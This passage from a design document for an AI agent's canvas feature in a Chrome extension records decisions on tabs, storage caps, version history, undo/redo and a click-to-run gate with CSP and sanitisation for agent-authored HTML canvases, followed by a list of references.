  edit / save / undo, Revert, Send / Ask, the folder, 重新寫入, downloads, print and the conflict
  view stay the user's buttons.
- Non-goals: real-time multi-user collaboration; network access from canvas content; arbitrary npm
  packages at runtime; pixel-faithful pptx.

## 6. Open questions (for Brett)

Each has a recommendation from the review (Jellyfish, 2026-10-10), which this draft follows.

1. ~~**Surface:** a canvas tab, or a resizable drawer inside the panel?~~ **Decided (Brett,
   2026-10-10):** a tab per canvas, grouped per conversation (§3.1). Editor: Milkdown (§2, §3.5).
2. ~~**`html` kind:** agent-authored script at all?~~ **Decided (Brett, 2026-10-10):** yes, the
   agent can use `html` (phase 2). It ships only with §3.2 in full (own frame, refused
   `save`/`selection`, load gate, the stated WebRTC/navigation leak, the banner). Jellyfish
   recommended the setting off by default; Brett's call is on by default, and the user can turn it off.
3. ~~**Caps:** is a 200 MB byte budget right?~~ **Decided (Brett, 2026-10-10):** start with 200 MB
   (§3.6) and revisit with real usage (`getBytesInUse` is shown in Settings). There is no cap on the
   number of canvases; only bytes count.
4. ~~**Edit visibility:** auto-note user edits in the next prompt, or only via `canvas_read`?~~
   **Decided (Brett, 2026-10-10):** no automatic note. The agent reads edits itself via
   `canvas_read`, and the user can push them with the **Send to agent** button (§3.7).
5. ~~**Order:** canvas phase 1 before multi-conversation, or after?~~ **Decided (Brett,
   2026-10-10):** canvas phase 1 first. Storage is keyed by `conversationId` from day one (§3.6); until
   multi-conversation lands the tab group is titled "Canvas", and group titles and collapse-on-switch
   (§3.1) are added with multi-conversation. (Collapse-on-switch was later dropped: multi-conversation
   §4.2, Brett 2026-10-13.)
6. ~~**Persistence beyond the Chrome profile?**~~ **Decided (Brett, 2026-10-10):** optional local
   folder mirror (§3.6), not a cloud sync.
7. ~~**Versions:** full history, latest + agent's last write, or none?~~ **Decided (Brett,
   2026-10-10):** latest + the agent's last write, with a revision counter (§3.5, §3.6).
   **Revised (Brett, 2026-10-11):** the last **N versions** of each canvas (N = 10, a setting,
   1–50), full content each; `latest` and `previous` point into the history and the agent's last
   write stays pinned; ◐ 顯示變更 compares previous → latest; the footprint against the 200 MB budget includes the history, and
   over budget whole canvases are evicted (history is not trimmed for room); the agent gets no
   access to old versions, but `stale.diffFromBase` now works for any `baseVersion` still in
   history; images any version references are kept; the folder mirrors the latest only; existing
   canvases migrate lazily (§3.5, §3.6, §3.10).
   **Revised again (Brett, 2026-10-11 21:13, after trying #117 in real Chrome: "just use editor's
   undo/redo"):** no view-mode ↶ / ↷ that saves an older version as a new one; the history above
   stays. Undo / redo is the editor's own, with ↶ 復原 / ↷ 重做 buttons in edit mode; agent writes
   cannot be undone by it (Revert to agent's, ask the agent, or the folder mirror + git) (§3.5).
8. ~~**`html` and act mode:** click to run, or gate `html` by act mode?~~ **Decided (Brett,
   2026-10-10):** (a) click to run. Raised in review after Q2: with `html` on by default, an `html`
   canvas would be an exfiltration path that skips act mode (§3.2 residual risk). Both options
   kept `html` on by default:
   - **(a) Click to run.** An `html` canvas first renders **without script in the existing
     `canvas-frame.html`**: its meta CSP `script-src 'self'`, DOMPurify (which strips forms and
     `<meta http-equiv=refresh>`) and link interception already make this "display, don't run",
     with no new code. In that state the host's allow-list for the frame also refuses `save` and
     `selection` (there is no editor). The host header has **Run scripts**; one click swaps the
     iframe to `canvas-html-frame.html` for that canvas revision (a host-caused load, new nonce,
     §3.2). A new revision needs a new click. Two pages, not one page switching modes by a URL
     parameter: a mode switch would have to inject the meta CSP from script at load, where one
     ordering mistake drops the protection; separate pages keep the boundary static.
   - **(b) Gate `html` by act mode.** `canvas_open`/`canvas_patch` with `kind:"html"` require act
     mode, like the browser tools; the other kinds stay ungated.
   *Recommended (Jellyfish, Orca): (a). It keeps working outside act mode, and every script run
   is a deliberate user action on content the user can see first.*

---

## References

- `[Artifacts]` Anthropic — What are artifacts and how do I use them? https://support.anthropic.com/en/articles/9487310-what-are-artifacts-and-how-do-i-use-them
- `[Canvas]` OpenAI — Introducing canvas. https://openai.com/index/introducing-canvas/
- `[MV3-CSP]` Chrome for Developers — Manifest: content_security_policy. https://developer.chrome.com/docs/extensions/reference/manifest/content-security-policy
- `[MV3-Sandbox]` Chrome for Developers — Manifest: sandbox. https://developer.chrome.com/docs/extensions/reference/manifest/sandbox
- `[MD-ADR]` [chat-markdown-rendering.md](./chat-markdown-rendering.md)
- `[Reveal6]` reveal.js 6.0.0 release notes. https://github.com/hakimel/reveal.js/releases/tag/6.0.0
- `[Mermaid12]` mermaid 12.0.0 release notes. https://github.com/mermaid-js/mermaid/releases
- pptxgenjs https://github.com/gitbrent/PptxGenJS · pptxtojson https://www.npmjs.com/package/pptxtojson ·
  Milkdown https://milkdown.dev · Chart.js https://www.chartjs.org
